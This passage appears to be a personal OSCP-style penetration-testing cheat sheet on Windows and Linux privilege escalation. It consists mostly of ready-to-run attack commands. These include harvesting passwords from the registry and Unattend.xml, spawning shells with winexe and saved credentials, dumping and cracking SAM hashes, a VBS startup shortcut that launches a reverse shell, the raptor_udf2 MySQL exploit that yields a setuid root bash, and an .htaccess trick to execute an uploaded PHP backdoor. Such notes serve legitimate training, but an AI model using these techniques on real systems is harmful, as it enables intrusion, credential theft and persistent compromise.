> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s
```

```bash
# Use winPEAS to check common password locations:
> .\winPEASany.exe quiet filesinfo userinfo
(the final checks will take a long time to complete)
# The results show both AutoLogon credentials and Putty session credentials for the admin user 
(admin/password123)

# We can verify these manually:
> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
# On Kali, we can use the winexe command to spawn a shell using these credentials:
winexe -U 'admin%password123' //192.168.1.22 cmd.exe
```

### Windows Privesc: Savedas
```bash
# Use winPEAS to check for saved credentials:
> .\winPEASany.exe quiet cmd windowscreds
# It appears that saved credentials for the admin user exist.
# We can verify this manually using the following command:
> cmdkey /list
# If the saved credentials aren’t present, run the following script to refresh the credential:
> C:\PrivEsc\savecred.bat
# We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
> runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

### Windows Privesc: Configuration Files
![image](https://github.com/nuricheun/OSCP/assets/14031269/553903e8-9be9-4d6b-9105-8f1c9d994e46)

```bash
## MUANL CHECK: Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:
> dir /s *pass* == *.config
# Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
> findstr /si password *.xml *.ini *.txt

## With winPEAS
# Use winPEAS to search for common files which may contain credentials:
> .\winPEASany.exe quiet cmd searchfast filesinfo
# The Unattend.xml file was found. View the contents:
> type C:\Windows\Panther\Unattend.xml
# A password for the admin user was found. The password is Base64 encoded: cGFzc3dvcmQxMjM=
# On Kali we can easily decode this:
$ echo "cGFzc3dvcmQxMjM=" | base64 -d
# Once again we can simply use winexe to spawn a shell as the admin user
```

### Windows Privesc: SAM !!!! when there's some windows.old or some backup, we must check for SAM and SYSTEM files!!!
If you have the ability to read the SAM and SYSTEM Files, you can extract the hashes.
The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.(LOCKED)
Backups of the files may exist in the c:\Windows\Repair or C:\Windows\System32\config\RegBack directory
![image](https://github.com/nuricheun/OSCP/assets/14031269/abe1f46d-35f7-4d20-9a95-e718c73568f1)

```bash
# Download the latest version of the creddump suite:
> git clone https://github.com/Neohapsis/creddump7.git
# Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
> python2 creddump7/pwdump.py SYSTEM SAM
# Crack the admin user hash using hashcat:
> hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

### Windows Privesc: Scheduled Tasks

```bash
> schtasks /query /fo LIST /v
#In PowerShell:
PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

### Windows Privesc: Startup Apps
```bash
Windows also has a startup directory for apps that should start for all users:
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp


# Use accesschk.exe to check permissions on the StartUp directory:
> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
> cscript CreateShortcut.vbs
```

```bash
### CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

###  Windows Privesc: Installed Applications

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


## Linux Privesc

### Linux Privesc: When victim machine doesn't have gcc and we can't install it, https://github.com/X0RW3LL/XenSpawn should be the solution (Ubuntu)



### Linux enumeration: search for backup files
```bash
# search for / (root), /tmp, /var/backups
```

### Linux Enumeration: automated with lse.sh
```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
chmod +x lse.sh
./lse.sh -l 1 -i
```

### Linux Privesc service enum
```bash
# show all processes running as root
ps aux | grep "^root"
dpkg -l | grep <program>
```

### Upgrade bash with python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Linux Switch to root
```bash
su
sudo su
```

### Linux exploit: Service exploit - gcc for mysql exploit (example): This is possbile when root's password is set to ''
```bash
# Add -fPIC when compiling for x64 system
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash'; chmod +s /tmp/rootbash');
exit
/tmp/rootbash -p
```

### Linux Privesc Setuid Binaries and Capabilities
```bash
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 
2> /dev/null

/usr/sbin/getcap -r / 2>/dev/null
```

### Linux Privesc find writable and executable ###
```bash
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

### Linux Privesc find all writable files in /etc/
```bash
$ find /etc -maxdepth 1 -writable -type f
```

### Find all readable files in /etc:
```bash
$ find /etc -maxdepth 1 -readable -type f
```

### Find all directories which can be written to: 
```bash
$ find / -executable -writable -type d 2> /dev/null
```

### PHP filter https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/
We can upload ".htaccess" file to the directory to let the server render my ".xxx" extension as PHP script. 
```bash
mv backdoor.php backdoor.xxx
echo "AddType application/x-httpd-php .xxx" > .htaccess
```

